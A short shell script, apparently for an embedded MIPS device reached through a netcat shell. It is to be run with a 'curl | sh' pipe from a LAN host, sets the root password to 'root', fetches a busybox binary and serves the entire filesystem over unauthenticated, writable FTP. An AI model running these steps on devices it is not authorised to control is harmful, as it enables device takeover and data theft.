# setup ftpd for downloading backup
# run this script in nc shell by: curl http://192.168.31.217/start_ftpd.sh | sh

echo -e "root\nroot" | passwd


pgrep busybox | xargs kill || true
rm -rf /tmp/busybox
curl -L "http://192.168.31.217/busybox-mipsel" --output /tmp/busybox
chmod +x /tmp/busybox


ln -sfn busybox ftpd # Create symlink needed for running ftpd
./busybox tcpsvd -vE 0.0.0.0 21 ./ftpd -Sw / >> /tmp/messages 2>&1 &

